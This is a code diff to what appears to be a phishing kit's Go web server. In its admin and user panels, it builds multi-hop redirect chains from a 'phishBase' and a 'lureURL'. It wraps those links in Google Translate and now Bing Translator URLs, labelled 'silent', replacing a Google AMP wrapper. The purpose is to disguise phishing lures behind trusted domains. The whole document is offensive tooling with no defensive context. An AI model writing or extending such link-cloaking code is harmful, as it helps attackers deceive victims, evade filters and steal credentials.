@@ -355,8 +355,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 						outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
 						if err == nil {
 							translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
-							ampPath := strings.TrimPrefix(outer, "https://")
-							ampLink := "https://www.google.com/amp/s/" + ampPath
+							bingLink := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)
 
 							chainID := fmt.Sprintf("chain-%d", i)
 							chainCell = fmt.Sprintf(`<details id="%s">
@@ -366,7 +365,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
   <div class="link"><a href="%s" target="_blank">%s</a>
   <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
 
-  <div class="label">Google AMP (silent)</div>
+  <div class="label">Bing Translator (silent)</div>
   <div class="link"><a href="%s" target="_blank">%s</a>
   <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
 
@@ -377,7 +376,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
   <div class="label" style="margin-top:8px">Hops</div>`,
 								chainID,
 								template.HTMLEscapeString(translateLink), template.HTMLEscapeString(truncateStr(translateLink, 60)), template.HTMLEscapeString(translateLink),
-								template.HTMLEscapeString(ampLink), template.HTMLEscapeString(truncateStr(ampLink, 60)), template.HTMLEscapeString(ampLink),
+								template.HTMLEscapeString(bingLink), template.HTMLEscapeString(truncateStr(bingLink, 60)), template.HTMLEscapeString(bingLink),
 								template.HTMLEscapeString(outer), template.HTMLEscapeString(truncateStr(outer, 60)), template.HTMLEscapeString(outer),
 							)
 							for j, hop := range hops {
@@ -582,8 +581,7 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 					outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
 					if err == nil {
 						translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
-						ampPath := strings.TrimPrefix(outer, "https://")
-						ampLink := "https://www.google.com/amp/s/" + ampPath
+						bingLink2 := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)
 
 						chainCell = fmt.Sprintf(`<details>
 <summary>▶ show chain links</summary>
@@ -592,7 +590,7 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
   <div class="link">%s
   <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
 
-  <div class="label">Google AMP</div>
+  <div class="label">Bing Translator (silent)</div>
   <div class="link">%s
   <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
 
@@ -600,7 +598,7 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
   <div class="link">%s
   <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
 							template.HTMLEscapeString(truncateStr(translateLink, 55)), template.HTMLEscapeString(translateLink),
-							template.HTMLEscapeString(truncateStr(ampLink, 55)), template.HTMLEscapeString(ampLink),
+							template.HTMLEscapeString(truncateStr(bingLink2, 55)), template.HTMLEscapeString(bingLink2),
 							template.HTMLEscapeString(truncateStr(outer, 55)), template.HTMLEscapeString(outer),
 						)
 						for j, hop := range hops {
